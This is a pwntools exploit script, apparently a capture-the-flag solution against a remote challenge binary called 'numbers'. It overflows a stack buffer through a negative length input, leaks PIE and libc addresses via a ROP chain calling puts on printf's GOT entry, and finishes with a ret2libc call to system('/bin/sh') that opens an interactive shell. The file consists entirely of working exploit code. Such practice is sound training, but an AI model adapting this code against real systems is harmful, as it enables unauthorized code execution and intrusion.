from pwn import *

e = ELF("./numbers")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("numbers.fword.wtf", 1237)
else:
  p = process(e.path)
  # {"LD_PRELOAD": libc.path})

p.sendlineafter("mind ??", "10")
p.sendlineafter("sure ??", "A")

p.sendlineafter("again ?", "y-1")
p.sendlineafter("sure ??", "A" * 23)

p.recvuntil("A" * 23 + "\n")
leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - 0x560687a1c8e9 + 0x0000560687a1c000
print(hex(leak))

debug()
p.sendlineafter("again ?", "y-1")
p.sendlineafter("sure ??", ("A" * 8).ljust(0x48, "\x00") + p64(leak +  0x00000ad3) + p64(leak + e.got["printf"]) + p64(leak + e.symbols["puts"]) + p64(leak +  0x00000ad3) + p64(0xffff) + p64(leak + 0x915))

p.recvuntil("A" * 8)
lleak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - libc.symbols["printf"]

print(hex(lleak))

p.sendlineafter("sure ??", "A" * 0x48 + p64(leak +  0x00000ad3 + 1) + p64(leak +  0x00000ad3) + p64(lleak + next(libc.search("/bin/sh"))) + p64(lleak + libc.symbols["system"]))





p.interactive()
